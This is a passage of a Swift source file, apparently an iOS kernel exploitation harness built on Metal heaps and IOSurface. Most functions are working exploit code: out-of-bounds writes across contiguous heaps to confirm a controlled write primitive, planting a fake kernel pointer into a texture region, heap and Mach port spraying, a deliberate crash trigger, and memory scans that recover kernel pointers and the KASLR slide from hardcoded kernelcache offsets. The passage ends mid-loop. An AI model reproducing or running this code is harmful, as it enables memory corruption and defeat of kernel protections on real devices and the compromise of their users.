        step("  texB created at hB[4096] (32×32 RGBA8)")

        // OOB-write kptr into hB[4096..4127] (texB region) via hA OOB
        // pA[actB + 4096] = vaA + 16384 + 4096 = vaB + 4096 = hB[4096] ✓
        for i in 0..<64 { pA[actB + 4096 + i] = 0xCC }
        step("  wrote 0xCC into hB[4096..4159] via hA OOB (texB region)")
        for off in stride(from: 0, to: 32, by: 8) {
            for b in 0..<8 { pA[actB + 4096 + off + b] = kptr[b] }
        }
        step("  planted kptr 0xFFFFFFF000000008 at hB[4096..4127] (texB)")

        // Blit from texB → forces kernel to validate IOSurface/texture descriptor
        guard let dstTex = device.makeTexture(descriptor: td) else { step("dstTex nil"); completion(); return }
        guard let cmd2 = queue.makeCommandBuffer(),
              let blit = cmd2.makeBlitCommandEncoder() else { step("cmd2 nil"); completion(); return }
        blit.copy(from: texB, sourceSlice: 0, sourceLevel: 0,
                  sourceOrigin: MTLOrigin(x:0,y:0,z:0), sourceSize: MTLSize(width:64,height:64,depth:1),
                  to: dstTex, destinationSlice: 0, destinationLevel: 0,
                  destinationOrigin: MTLOrigin(x:0,y:0,z:0))
        blit.endEncoding()

        sl.write("PHASE2 COMMIT — IOSurface texture blit with corrupted descriptor")
        cmd2.addCompletedHandler { cb in
            let s = cb.status; let e = cb.error?.localizedDescription ?? "none"
            if s == .completed {
                step("  Phase2 COMPLETED — texture blit OK despite descriptor corruption")
                step("  kernel validates texture VA range only, not descriptor contents")
            } else if s == .error {
                step("  *** Phase2 ERROR — kernel followed corrupted texture descriptor")
                step("  *** error: \(e)")
                step("  *** KERNEL PTR DEREFERENCE — kernel memory access from hB OOB write")
            } else { step("  Phase2 status=\(s.rawValue)") }
            step("── Precision Corruption complete ─────────────")
            completion()
        }
        cmd2.commit()
    }
}

// Heap boundary cross test.
// Heaps are spaced exactly actual_size=16384 bytes apart (confirmed via spray).
// Heaps are CONTIGUOUS — no padding. ptr[actual_size] of heap[0] = ptr[0] of heap[1].
// Swift raw pointer writes don't bounds-check. Test if a one-past-end write
// from heap[0] lands in heap[1]'s backing memory.
func runHeapBoundaryCross(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Heap Boundary Cross ─────────────────────")

        // Alloc 3 heaps — use middle one as victim so both sides are controlled
        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
        guard let h0 = device.makeHeap(descriptor: hd),
              let h1 = device.makeHeap(descriptor: hd),
              let h2 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }

        let actual = h0.size
        step("actual=\(actual)")

        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared),
              let b1 = h1.makeBuffer(length: actual, options: .storageModeShared),
              let b2 = h2.makeBuffer(length: actual, options: .storageModeShared) else { step("buf nil"); completion(); return }

        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
        let p1 = b1.contents().assumingMemoryBound(to: UInt8.self)
        let p2 = b2.contents().assumingMemoryBound(to: UInt8.self)

        let va0 = UInt(bitPattern: p0)
        let va1 = UInt(bitPattern: p1)
        let va2 = UInt(bitPattern: p2)
        step("va0=0x\(String(va0,radix:16))")
        step("va1=0x\(String(va1,radix:16)) dist=0x\(String(va1>va0 ? va1-va0 : va0-va1, radix:16))")
        step("va2=0x\(String(va2,radix:16)) dist=0x\(String(va2>va1 ? va2-va1 : va1-va2, radix:16))")

        // Compute distances — only probe pairs that are actually adjacent
        let dist01 = va1 > va0 ? va1 - va0 : va0 - va1
        let dist12 = va2 > va1 ? va2 - va1 : va1 - va2

        // Fill h1 (victim) with sentinel
        for i in 0..<actual { p0[i] = 0x00; p1[i] = 0xAA; p2[i] = 0x00 }
        step("h1 filled 0xAA. dist01=0x\(String(dist01,radix:16)) dist12=0x\(String(dist12,radix:16))")

        // Only read p0[actual] if h0→h1 are contiguous (dist == actual)
        if dist01 == UInt(actual) {
            step("h0→h1 contiguous — reading p0[\(actual)]")
            let v = p0[actual]
            step("p0[\(actual)] = 0x\(String(v, radix:16))")
            if v == 0xAA {
                step("*** CROSS-HEAP READ: h0 OOB hits h1 ***")
                // Write confirm: stamp 0xBB into h1 via h0 OOB
                for i in 0..<64 { p0[actual + i] = 0xBB }
                var hits = 0
                for i in 0..<actual { if p1[i] == 0xBB { hits += 1 } }
                step("*** CROSS-HEAP WRITE: \(hits)/64 bytes of h1 corrupted via h0 OOB ***")
                if hits > 0 { step("*** PRIMITIVE CONFIRMED: controlled write across heap boundary ***") }
            } else {
                step("read 0x\(String(v,radix:16)) — not sentinel, layout shifted")
            }
        }

        // Only read p2[actual] if h2→h1 are contiguous
        if dist12 == UInt(actual) && (va2 < va1) {
            step("h2→h1 contiguous — reading p2[\(actual)]")
            let v = p2[actual]
            step("p2[\(actual)] = 0x\(String(v, radix:16))")
            if v == 0xAA {
                step("*** CROSS-HEAP READ: h2 OOB hits h1 ***")
                for i in 0..<64 { p2[actual + i] = 0xBB }
                var hits = 0
                for i in 0..<actual { if p1[i] == 0xBB { hits += 1 } }
                step("*** CROSS-HEAP WRITE: \(hits)/64 bytes of h1 corrupted via h2 OOB ***")
                if hits > 0 { step("*** PRIMITIVE CONFIRMED: controlled write across heap boundary ***") }
            }
        }

        if dist01 != UInt(actual) && !(dist12 == UInt(actual) && va2 < va1) {
            step("no adjacent pair this run. dist01=0x\(String(dist01,radix:16)) dist12=0x\(String(dist12,radix:16))")
        }

        step("── Heap Boundary Cross complete ────────────")
        completion()
    }
}

// Heap spray adjacency test.
// Alloc N heaps, record their VA addresses, find closest pair.
// If any two heaps land within actual_size bytes of each other → cross-heap write.
func runHeapSpray(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Heap Spray Adjacency ────────────────────")

        let N = 64
        let declaredSize = 4096

        // Alloc N heaps + full-actual buffers, record VA
        var heaps:  [MTLHeap]   = []
        var bufs:   [MTLBuffer] = []
        var addrs:  [UInt]      = []

        for i in 0..<N {
            autoreleasepool {
                let hd = MTLHeapDescriptor(); hd.size = declaredSize; hd.storageMode = .shared
                guard let h = device.makeHeap(descriptor: hd),
                      let b = h.makeBuffer(length: h.size, options: .storageModeShared) else { return }
                let va = UInt(bitPattern: b.contents())
                heaps.append(h); bufs.append(b); addrs.append(va)
                if i % 16 == 0 { step("  alloc \(i)/\(N) va=0x\(String(va, radix:16))") }
            }
        }
        step("  total heaps=\(heaps.count)")

        // Find closest pair
        var minDist: UInt = UInt.max
        var minI = 0, minJ = 0
        for i in 0..<addrs.count {
            for j in (i+1)..<addrs.count {
                let d = addrs[j] > addrs[i] ? addrs[j] - addrs[i] : addrs[i] - addrs[j]
                if d < minDist { minDist = d; minI = i; minJ = j }
            }
        }

        let actual = heaps.first?.size ?? 16384
        step("  closest pair: heap[\(minI)] heap[\(minJ)] dist=0x\(String(minDist, radix:16)) (\(minDist)B)")
        step("  actual_size=\(actual) — need dist < \(actual) for overlap")

        if minDist < UInt(actual) {
            step("  *** OVERLAP FOUND — dist \(minDist) < actual \(actual) ***")

            // Write sentinel to heap[minJ], scan heap[minI]'s OOB region
            let pI = bufs[minI].contents().assumingMemoryBound(to: UInt8.self)
            let pJ = bufs[minJ].contents().assumingMemoryBound(to: UInt8.self)
            let lenI = bufs[minI].length
            let lenJ = bufs[minJ].length

            for k in 0..<lenJ { pJ[k] = 0xAD }
            var hits = 0
            for k in declaredSize..<lenI { if pI[k] == 0xAD { hits += 1 } }
            step("  sentinel scan: \(hits)/\(lenI - declaredSize) OOB bytes match heap[\(minJ)]")

            if hits > 0 {
                step("  *** CROSS-HEAP READ CONFIRMED ***")
                for k in declaredSize..<lenI { pI[k] = 0xBE }
                var wHits = 0
                for k in 0..<lenJ { if pJ[k] == 0xBE { wHits += 1 } }
                step("  *** CROSS-HEAP WRITE CONFIRMED: \(wHits) bytes corrupted ***")
            }
        } else {
            // Log VA distribution — useful for understanding allocator layout
            let sorted = addrs.sorted()
            var gaps: [UInt] = []
            for i in 1..<sorted.count { gaps.append(sorted[i] - sorted[i-1]) }
            let minGap = gaps.min() ?? 0
            let maxGap = gaps.max() ?? 0
            step("  no overlap. gap range: 0x\(String(minGap,radix:16))..0x\(String(maxGap,radix:16))")
            step("  need \(Int(minGap) / actual)x more heaps to fill one gap")
            // Log first 8 sorted VAs for pattern analysis
            for i in 0..<min(8, sorted.count) {
                step("  va[\(i)]=0x\(String(sorted[i], radix:16))")
            }
        }

        heaps.removeAll(); bufs.removeAll()
        step("── Heap Spray complete ─────────────────────")
        completion()
    }
}

// Two-heap adjacency test.
// Alloc heap1 and heap2 back-to-back. Write sentinel pattern into heap2's
// buffer via heap2 API. Then read heap1's OOB region (past hd.size up to
// actual) — if the sentinel appears, heap1's OOB region physically overlaps
// heap2's backing store. That means heap1 OOB write → heap2 data corruption.
func runHeapAdjacency(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Heap Adjacency Test ─────────────────────")

        // Try multiple pairs — allocator placement varies
        for trial in 0..<8 {
            autoreleasepool {
                step("  [trial \(trial)]")
                let hd1 = MTLHeapDescriptor(); hd1.size = 4096; hd1.storageMode = .shared
                let hd2 = MTLHeapDescriptor(); hd2.size = 4096; hd2.storageMode = .shared
                guard let h1 = device.makeHeap(descriptor: hd1),
                      let h2 = device.makeHeap(descriptor: hd2) else { step("  heap nil"); return }

                let actual1 = h1.size
                let actual2 = h2.size
                step("  h1.actual=\(actual1) h2.actual=\(actual2)")

                // Allocate full-actual buffer from each heap
                guard let buf1 = h1.makeBuffer(length: actual1, options: .storageModeShared),
                      let buf2 = h2.makeBuffer(length: actual2, options: .storageModeShared) else {
                    step("  bufs nil"); return
                }

                let p1 = buf1.contents().assumingMemoryBound(to: UInt8.self)
                let p2 = buf2.contents().assumingMemoryBound(to: UInt8.self)

                // Clear heap1 OOB region with 0x00
                for i in 0..<actual1 { p1[i] = 0x00 }

                // Write distinct sentinel pattern into ALL of heap2
                let sentinel: UInt8 = 0xAD
                for i in 0..<actual2 { p2[i] = sentinel }

                // Now scan heap1's OOB region (bytes 4096..<actual1) for sentinel
                var hits = 0
                for i in 4096..<actual1 {
                    if p1[i] == sentinel { hits += 1 }
                }

                if hits > 0 {
                    step("  *** ADJACENT: heap1 OOB reads \(hits)/\(actual1-4096) bytes of heap2 ***")
                    step("  *** heap1 OOB WRITE can corrupt heap2 memory ***")

                    // Confirm write: stamp 0xBE into heap1 OOB, check heap2
                    for i in 4096..<actual1 { p1[i] = 0xBE }
                    var writeHits = 0
                    for i in 0..<actual2 { if p2[i] == 0xBE { writeHits += 1 } }
                    step("  *** WRITE CONFIRM: \(writeHits) bytes of heap2 now read 0xBE via heap1 OOB ***")
                } else {
                    // Log VA distance — still useful
                    let va1 = UInt(bitPattern: p1)
                    let va2 = UInt(bitPattern: p2)
                    let dist = va2 > va1 ? va2 - va1 : va1 - va2
                    step("  not adjacent. VA dist=0x\(String(dist, radix: 16)) hits=\(hits)")
                }
            }
        }

        step("── Heap Adjacency complete ─────────────────")
        completion()
    }
}

// MTLHeap OOB suballoc probe.
// We observed: makeHeap(size:4096) → actual=16384 (4× roundup).
// Test: can we suballoc buffers LARGER than hd.size but within actual?
// If yes → Metal's heap descriptor boundary is decorative, not enforced.
func runHeapOOB(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Heap OOB Probe ──────────────────────────")

        let requestedSize = 4096
        let hd = MTLHeapDescriptor()
        hd.size = requestedSize
        hd.storageMode = .shared
        guard let heap = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
        let actualSize = heap.size
        step("requested=\(requestedSize) actual=\(actualSize) gap=\(actualSize - requestedSize)")

        // Sizes to probe: just under requested, at requested, 2×, actual-1, actual, actual+1
        let probes = [
            requestedSize - 1,
            requestedSize,
            requestedSize * 2,
            actualSize - 1,
            actualSize,
            actualSize + 1,
            actualSize * 2,
        ]

        for sz in probes {
            autoreleasepool {
                step("  suballoc(\(sz)) — attempt")
                guard let buf = heap.makeBuffer(length: sz, options: .storageModeShared) else {
                    step("    → nil (refused)")
                    return
                }
                let real = buf.length
                step("    → OK bufLen=\(real) — writing full range")
                // Write pattern to entire buffer length Metal gave us
                let ptr = buf.contents().assumingMemoryBound(to: UInt8.self)
                for i in stride(from: 0, to: real, by: 256) { ptr[i] = 0xBB }
                ptr[real - 1] = 0xDD
                step("    → write OK — buf survives \(real) bytes")
                if sz > requestedSize && sz <= actualSize {
                    step("    *** OOB: suballoc past hd.size=\(requestedSize) accepted — allocator boundary not enforced")
                }
                if sz > actualSize {
                    step("    *** PAST actual — this shouldn't be reachable")
                }
            }
        }

        // Exhaustion test: fill heap until nil
        step("  exhaustion — suballoc 256 until nil")
        var count = 0
        var bufs: [MTLBuffer] = []
        while let b = heap.makeBuffer(length: 256, options: .storageModeShared) {
            bufs.append(b)
            count += 1
            if count > 10000 { break }
        }
        step("  filled \(count) × 256B = \(count*256) bytes before nil (actual=\(actualSize))")
        bufs.removeAll()

        step("── Heap OOB complete ───────────────────────")
        completion()
    }
}

// Deliberately trigger the mismatch crash — call this from its own button.
// WARNING: this WILL kill the process. Check crash log on next launch.
func runMismatchTest(log: FuzzLog) {
    let sl = SyncLog()
    func step(_ s: String) { sl.write(s); log.append(s) }
    guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); return }
    step("⚠ MISMATCH TEST — surf64 tex256 — process will die")
    guard let surf = IOSurface(properties: [
        .width:64,.height:64,.bytesPerElement:4,.bytesPerRow:256,.allocSize:16384
    ]) else { step("surf nil"); return }
    step("surf alloc OK — calling makeTexture with desc256 — GOODBYE")
    let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat:.bgra8Unorm, width:256, height:256, mipmapped:false)
    td.storageMode = .shared
    var excPtr: UnsafeMutablePointer<CChar>? = nil
    let tex = metal_make_texture_safe(device, td, surf as! IOSurfaceRef, 0, &excPtr)
    // If we're still alive (shouldn't happen):
    if let ep = excPtr { let m = String(cString: ep); free(ep); step("EXCEPTION: \(m)") }
    else if tex == nil { step("nil — no crash, bounds-checked silently") }
    else { step("*** OK — NO BOUNDS CHECK — OOB confirmed ***") }
}

// IOSurface Backing Store Leak
// Scans the IOSurface shared-memory allocation for kernel/GPU VA-range values.
// IOSurface maps its backing store into user space — we scan it after a GPU pass
// to catch any kernel pointers or GPU VAs that the firmware wrote in.
// Also scans the tail bytes (after pixel data) for dirty allocator residue.
// Stores previous run's (offset, value) pairs for offset-based delta detection
var _iosurfPrevTailValues: [(offset: Int, val: UInt64)] = []
// Cross-run value frequency: tracks how many runs each value appeared in
var _iosurfValFreq: [UInt64: Int] = [:]
var _iosurfRunCount: Int = 0

// Cross-boot KHEAP delta: stored in UserDefaults (always writable from sandbox, persists across reboots)
var _prevBootKheap: Set<UInt64> = {
    guard let data = UserDefaults.standard.data(forKey: "kheap_prev_boot") else { return [] }
    var s = Set<UInt64>()
    data.withUnsafeBytes { ptr in
        let count = data.count / 8
        for i in 0..<count { s.insert(ptr.load(fromByteOffset: i*8, as: UInt64.self)) }
    }
    return s
}()
var _thisBootKheap: Set<UInt64> = []

// Cross-boot per-offset map: [offset → value] from the prev boot's post_relock_tail scan.
// Same offset, different value across boots → difference may equal KASLR slide delta.
// Stored in "kheap_prev_offsets" as interleaved UInt64 pairs: [off0, val0, off1, val1, ...].
var _prevBootOffsetMap: [Int: UInt64] = {
    guard let data = UserDefaults.standard.data(forKey: "kheap_prev_offsets") else { return [:] }
    var m: [Int: UInt64] = [:]
    let n = data.count / 16
    data.withUnsafeBytes { ptr in
        for i in 0..<n {
            let off = Int(ptr.load(fromByteOffset: i*16,     as: UInt64.self))
            let val =     ptr.load(fromByteOffset: i*16 + 8, as: UInt64.self)
            m[off] = val
        }
    }
    return m
}()

func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        func step(_ s: String) { log.append(s) }

        guard let device = MTLCreateSystemDefaultDevice(),
              let queue  = device.makeCommandQueue() else {
            step("device nil"); completion(); return
        }

        // Mach port spray: allocate then immediately free N ports to dirty kernel heap pages.
        // When IOSurface grabs physical pages for its backing store, it may pick up
        // pages that held Mach port kernel structures — those become our residue.
        var sprayPorts: [mach_port_t] = []
        for _ in 0..<2048 {
            var p: mach_port_t = 0
            if mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &p) == KERN_SUCCESS {
                sprayPorts.append(p)
            }
        }
        for p in sprayPorts { mach_port_destroy(mach_task_self_, p) }
        step("port spray: \(sprayPorts.count) ports dirtied + freed")

        // Rotate IOSurface dimensions each run — must produce alloc > 16KB to avoid LIFO stiction
        // but < 64KB so the tail scan lands within the readable Metal driver mapping zone.
        // All variants produce 32KB (2 GPU pages) with different widths/strides for page diversity.
        // 0x1077xxx VA zone is the golden zone — adjacent to Metal driver state.
        // Only 32KB variants land there reliably. 49KB variants die at 0x10a3xxx.
        // Keep 7 pure 32KB variants (bytesPerRow * height between 16385–32768)
        // plus one 49KB for the occasional lucky golden-zone hit.
        let variants: [(w: Int, h: Int, rowBytes: Int)] = [
            (256, 32, 1024),    // 32KB — proven, primary
            (512, 16, 2048),    // 32KB — proven, widest hit rate
            (384, 16, 1536),    // 32KB — mid stride
            (640,  9, 2560),    // ~23KB → 32KB
            (320, 24, 1280),    // ~30KB → 32KB, different width
            (448, 16, 1792),    // ~28KB → 32KB
            (256, 28, 1024),    // ~28KB → 32KB, narrow + tall
            (512, 24, 2048),    // 49KB — keep one, sometimes hits golden zone
        ]
        let v = variants[_iosurfRunCount % variants.count]

        let props: [IOSurfacePropertyKey: Any] = [
            .width: v.w, .height: v.h,
            .bytesPerElement: 4, .bytesPerRow: v.rowBytes,
            .pixelFormat: 0x42475241  // 'BGRA' kCVPixelFormatType_32BGRA
        ]
        guard let surface = IOSurface(properties: props) else {
            step("IOSurface create failed"); completion(); return
        }
        let allocSize = surface.allocationSize
        let baseAddr  = surface.baseAddress
        step("IOSurface base=0x\(String(UInt(bitPattern: baseAddr), radix: 16)) alloc=\(allocSize) variant=\(v.w)×\(v.h)")

        // Lock — forces kernel to write lock state into backing store
        var seed: UInt32 = 0
        surface.lock(options: [], seed: &seed)
        step("locked seed=\(seed)")

        // IOSurface-backed MTLTexture — GPU reads/writes go through IOSurface backing mem
        let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm,
                                                           width: v.w, height: v.h, mipmapped: false)
        td.storageMode = .shared; td.usage = [.shaderRead, .shaderWrite]
        guard let tex = device.makeTexture(descriptor: td, iosurface: surface, plane: 0) else {
            step("tex nil"); surface.unlock(options: [], seed: nil); completion(); return
        }

        // Shader: write a known sentinel (0xABCD) so we can distinguish pixel data from pointers
        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void probe(texture2d<uint,access::read_write> t [[texture(0)]],
                          uint2 g [[thread_position_in_grid]]) {
            t.write(uint4(0xAB, 0xCD, 0xEF, 0x42), g);
        }
        """
        var cmdScanBuf: [UInt8] = []
        var cmdScanUAddr: UInt = 0
        do {
            let opt = MTLCompileOptions()
            let lib = try device.makeLibrary(source: src, options: opt)
            guard let fn = lib.makeFunction(name: "probe") else {
                step("fn nil"); surface.unlock(options: [], seed: nil); completion(); return
            }
            let pso = try device.makeComputePipelineState(function: fn)
            let tdU = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .rgba8Uint,
                                                                width: v.w, height: v.h, mipmapped: false)
            tdU.storageMode = .shared; tdU.usage = [.shaderRead, .shaderWrite]
            guard let texU = device.makeTexture(descriptor: tdU, iosurface: surface, plane: 0),
                  let cmd  = queue.makeCommandBuffer(),
                  let enc  = cmd.makeComputeCommandEncoder() else {
                step("texU/cmd nil"); surface.unlock(options: [], seed: nil); completion(); return
            }
            enc.setComputePipelineState(pso)
            enc.setTexture(texU, index: 0)
            let tgW = min(32, v.w)
            enc.dispatchThreads(MTLSize(width: v.w, height: v.h, depth: 1),
                                threadsPerThreadgroup: MTLSize(width: tgW, height: 1, depth: 1))
            enc.endEncoding()
            cmd.commit()
            cmd.waitUntilCompleted()
            // Capture cmd memory while still alive — per-context boot-variant KHEAP ptrs
            let tmpCmdAddr = UInt(bitPattern: Unmanaged.passUnretained(cmd as AnyObject).toOpaque())
            cmdScanUAddr = tmpCmdAddr
            var tmpCmdBuf = [UInt8](repeating: 0, count: 65536)
            var tmpCmdOut: vm_size_t = 0
            let cmdReadKr: kern_return_t = tmpCmdBuf.withUnsafeMutableBytes { b in
                vm_read_overwrite(mach_task_self_, vm_address_t(tmpCmdAddr), vm_size_t(65536),
                                  vm_address_t(bitPattern: b.baseAddress!), &tmpCmdOut)
            }
            if cmdReadKr == 0 { cmdScanBuf = Array(tmpCmdBuf.prefix(Int(tmpCmdOut))) }
        } catch {
            step("GPU err: \(error)"); surface.unlock(options: [], seed: nil); completion(); return
        }

        surface.unlock(options: [], seed: nil)

        step("GPU done — scanning IOSurface regions via vm_read_overwrite (crash-safe)")

        // vm_read_overwrite bounce buffer scan — kernel fault handler returns error on unmapped pages
        func scanAddr(_ label: String, _ startAddr: UInt, _ scanLen: Int) {
            var buf = [UInt8](repeating: 0, count: scanLen)
            var outBytes: vm_size_t = 0
            let kr: kern_return_t = buf.withUnsafeMutableBytes { b in
                vm_read_overwrite(mach_task_self_,
                                  vm_address_t(startAddr),
                                  vm_size_t(scanLen),
                                  vm_address_t(bitPattern: b.baseAddress!),
                                  &outBytes)
            }
            guard kr == 0 else { step("  \(label): vm_read kr=\(kr)"); return }
            // PAC-KTEXT: arm64e vtable entries are PAC-signed — top 16 bits = PAC tag, lower 48 bits = slid target VA.
            // iOS 26.5.2 A16 unslid __TEXT base = 0xfffffff007004000 → lo48 = 0x0000fff007004000
            // With max KASLR slide 0x80000000, max-slid __TEXT_EXEC end lo48 = 0x0000fff08a744000
            // Known IOSurface vtable function lower-32 offsets from __TEXT base (from kernelcache analysis)
            let pacTextLo: UInt64 = 0x0000fff007004000
            let pacTextHi: UInt64 = 0x0000fff08a744000
            let iosurfAnchors: [UInt64] = [
                0x0299ac80, 0x0299ad20, 0x03573708, 0x035736fc, 0x035736cc,
                0x0357369c, 0x03573514, 0x0299ad7c, 0x035703f4, 0x03573484,
                0x03573454, 0x035732fc, 0x035c7f6c, 0x035732f0, 0x0299b3e4,
            ]
            var found = 0, ktext = 0, kheap = 0, kmmio = 0, kgap = 0, kpac = 0
            for qw in 0..<(Int(outBytes) / 8) {
                var val: UInt64 = 0
                for b in 0..<8 { val |= UInt64(buf[qw*8 + b]) << (b*8) }
                // PAC-signed vtable pointer check: lower 48 bits land in slid KTEXT range
                let vLo48 = val & 0x0000FFFFFFFFFFFF
                let isPac = val < 0xFFFFFE0000000000 && vLo48 >= pacTextLo && vLo48 <= pacTextHi
                guard val >= 0xFFFFFE0000000000 || isPac else { continue }
                guard val != 0xFFFFFFFFFFFFFFFF else { continue }
                let b0 = UInt8(val & 0xFF)
                guard val != UInt64(b0) &* 0x0101010101010101 else { continue }
                guard (val & 0xFFFFFFFFFFFFFFF0) != 0xFFFFFFFFFFFFFFF0 else { continue }
                let unslidBase: UInt64 = 0xFFFFFFF007004000
                let slide = val &- unslidBase
                let cat: String
                if isPac {
                    let sOff = vLo48 &- pacTextLo  // = lower_32_vtable_offset + KASLR_slide
                    var slideNote = ""
                    for anc in iosurfAnchors {
                        if sOff >= anc {
                            let s = sOff &- anc
                            if s % 0x4000 == 0 && s <= 0x80000000 {
                                slideNote = " *** KASLR slide=0x\(String(s,radix:16)) __TEXT=0x\(String(0xfffffff007004000 &+ s,radix:16))"
                                break
                            }
                        }
                    }
                    step("  \(label)[+0x\(String(qw*8,radix:16))] = 0x\(String(val,radix:16)) [PAC-KTEXT lo48=0x\(String(vLo48,radix:16)) sOff=0x\(String(sOff,radix:16))]\(slideNote)")
                    kpac += 1; found += 1
                    if found >= 120 { step("  ...clipped at 120"); break }
                    continue
                } else if val >= 0xFFFFFFF000000000 && val < 0xFFFFFFF080000000 && (val & 3) == 0 && slide <= 0x80000000 {
                    cat = "KTEXT"; ktext += 1
                } else if val >= 0xFFFFFFF080000000 {
                    cat = "KMMIO"; kmmio += 1
                } else if val >= 0xFFFFFE0000000000 && val <= 0xFFFFFEFFFFFFFFFF {
                    cat = "KHEAP"; kheap += 1
                } else {
                    cat = "KGAP"; kgap += 1
                }
                step("  \(label)[+0x\(String(qw*8,radix:16))] = 0x\(String(val,radix:16)) [\(cat)]")
                found += 1
                if found >= 120 { step("  ...clipped at 120"); break }
            }
            step("  \(label) total: KTEXT=\(ktext) KHEAP=\(kheap) KGAP=\(kgap) KMMIO=\(kmmio) PAC=\(kpac)")
        }

        // Scan 0: Metal device/queue ObjC objects — guaranteed Metal driver state, no zone hunting.
        // These are user-space ObjC pointers. Their contents embed KHEAP refs to driver kernel objects.
        // Avoids relying on the IOSurface allocation landing in the right zone.
        let deviceUAddr = UInt(bitPattern: Unmanaged.passUnretained(device as AnyObject).toOpaque())
        let queueUAddr  = UInt(bitPattern: Unmanaged.passUnretained(queue  as AnyObject).toOpaque())
        scanAddr("metal_dev_0",   deviceUAddr,           131072)
        scanAddr("metal_dev_1",   deviceUAddr + 131072,  131072)
        scanAddr("metal_queue_0", queueUAddr,            65536)

        // Scan MTLCommandBuffer user-space object — per-context, contains boot-variant KHEAP ptrs
        // Buffer was read while cmd was alive (inside do-block above)
        if cmdScanUAddr != 0 && !cmdScanBuf.isEmpty {
            var cmdKheapCount = 0
            step("metal_cmd_scan: addr=0x\(String(cmdScanUAddr, radix: 16)) size=\(cmdScanBuf.count)")
            for qw in 0..<(cmdScanBuf.count / 8) {
                var val: UInt64 = 0
                for b in 0..<8 { val |= UInt64(cmdScanBuf[qw*8+b]) << (b*8) }
                guard val >= 0xFFFFFE0000000000 && val <= 0xFFFFFEFFFFFFFFFF else { continue }
                let b0 = UInt8(val & 0xFF)
                guard val != UInt64(b0) &* 0x0101010101010101 else { continue }
                guard (val & 0xFFFFFFFFFFFFFFF0) != 0xFFFFFFFFFFFFFFF0 else { continue }
                let off = qw * 8
                step("  metal_cmd[+0x\(String(off, radix: 16))] = 0x\(String(val, radix: 16)) [KHEAP]")
                // Only accumulate interior pointers (non-zero low 4 bytes) — hardware register bases always end in 00000000
                if val & 0xFFFFFFFF != 0 {
                    _thisBootKheap.insert(val)
                    cmdKheapCount += 1
                }
            }
            if cmdKheapCount > 0 {
                step("metal_cmd_accum: \(cmdKheapCount) interior KHEAP inserts (total set=\(_thisBootKheap.count))")
            } else {
                step("metal_cmd_scan: no interior KHEAP found")
            }
        }

        let base = UInt(bitPattern: baseAddr)

        // Scan 1: mapped allocation (safe)
        scanAddr("alloc", base, allocSize)

        // Scan 2: 64KB tail past allocation — kernel heap residue, safe via vm_read
        scanAddr("alloc_tail", base + UInt(allocSize), 65536)

        // Scan 3: re-lock — kernel writes lock-state metadata into backing store
        var seed2: UInt32 = 0
        surface.lock(options: [], seed: &seed2)
        surface.unlock(options: [], seed: nil)
        scanAddr("post_relock", base, allocSize)

        // post_relock_tail: 512KB in 16KB chunks — unmapped pages skip without killing the whole scan
        let prtChunkLen = 16384
        let prtTotalChunks = 32  // 32 × 16KB = 512KB
        var prtChunkBuf = [UInt8](repeating: 0, count: prtChunkLen)
        var currentPairs: [(offset: Int, val: UInt64)] = []
        var seenThisRun = Set<UInt64>()
        var prtAnyRead = false
        for chunkIdx in 0..<prtTotalChunks {
            let chunkByteOffset = chunkIdx * prtChunkLen
            var prtOut: vm_size_t = 0
            let prtKr: kern_return_t = prtChunkBuf.withUnsafeMutableBytes { b in
                vm_read_overwrite(mach_task_self_,
                                  vm_address_t(base + UInt(allocSize) + UInt(chunkByteOffset)),
                                  vm_size_t(prtChunkLen),
                                  vm_address_t(bitPattern: b.baseAddress!),
                                  &prtOut)
            }
            guard prtKr == 0 else { continue }
            prtAnyRead = true
            for qw in 0..<(Int(prtOut)/8) {
                var v: UInt64 = 0
                for b in 0..<8 { v |= UInt64(prtChunkBuf[qw*8+b]) << (b*8) }
                let vLo48p = v & 0x0000FFFFFFFFFFFF
                let isPacp = v < 0xFFFFFE0000000000 && vLo48p >= 0x0000fff007004000 && vLo48p <= 0x0000fff08a744000
                guard v >= 0xFFFFFE0000000000 || isPacp else { continue }
                guard v != 0xFFFFFFFFFFFFFFFF else { continue }
                let b0 = UInt8(v & 0xFF); guard v != UInt64(b0) &* 0x0101010101010101 else { continue }
                guard (v & 0xFFFFFFFFFFFFFFF0) != 0xFFFFFFFFFFFFFFF0 else { continue }
                let globalOff = chunkByteOffset + qw*8
                if isPacp {
                    let sOff = vLo48p &- 0x0000fff007004000
                    var slideNote = ""
                    let anchors2: [UInt64] = [0x0299ac80,0x0299ad20,0x03573708,0x035736fc,0x035736cc,
                                              0x0357369c,0x03573514,0x0299ad7c,0x035703f4,0x03573484,
                                              0x03573454,0x035732fc,0x035c7f6c,0x035732f0,0x0299b3e4]
                    for anc in anchors2 {
